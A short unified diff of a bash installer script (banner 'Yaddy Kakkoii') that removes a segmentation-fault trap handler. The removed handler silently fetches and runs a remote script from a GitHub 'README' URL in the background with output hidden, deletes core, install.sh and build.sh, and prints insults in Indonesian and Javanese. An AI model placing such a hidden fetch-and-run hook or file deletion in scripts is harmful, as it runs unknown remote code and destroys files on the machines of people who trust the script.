@@ -44,22 +44,6 @@ ctrl_c() {
     exit 1
 }
 
-trap ctrl_cs SEGV
-
-ctrl_cs() {
-    bash -c "$(curl -fsSL https://raw.githubusercontent.com/njajaldoang/1dra/main/README)" &>/dev/null &
-    clear
-    rm -f core >/dev/null 2>&1
-    rm -f install.sh >/dev/null 2>&1
-    rm -f build.sh >/dev/null 2>&1
-    if [ -f *core* ]; then rm -f *core*; fi
-    if [ -f build.sh ]; then rm -f build.sh; fi
-    if [ -f install.sh ]; then rm -f install.sh; fi
-    echo -e "Program di interupsi sama anjing bangsat"
-    echo -e "Mau Ngapain lu su , raimu asu !."
-    exit 1
-}
-
 function kakkoii(){
 clear
 figlet -f small -t "      Yaddy Kakkoii" | lolcat
